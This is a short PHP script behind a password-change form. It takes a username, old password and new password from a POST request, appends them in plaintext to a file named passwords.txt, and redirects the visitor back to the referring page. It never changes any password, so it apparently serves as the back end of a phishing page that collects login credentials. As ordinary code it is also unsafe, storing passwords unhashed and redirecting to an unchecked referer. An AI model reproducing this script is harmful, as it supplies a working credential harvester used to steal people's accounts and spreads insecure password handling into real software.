<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $oldPassword = $_POST["oldPassword"];
    $newPassword = $_POST["newPassword"];

    // Combine the username, old password, and new password into a single string
    $data = "Username: " . $username . "\n" .
            "Old Password: " . $oldPassword . "\n" .
            "New Password: " . $newPassword . "\n";

    // Save the data to a text file named "passwords.txt"
    $file = fopen("passwords.txt", "a"); // Use "a" mode to append data to the file
    fwrite($file, $data);
    fclose($file);

    // Optionally, you can redirect the user back to the previous page after saving the data
    header("Location: " . $_SERVER["HTTP_REFERER"]);
    exit;
}
?>
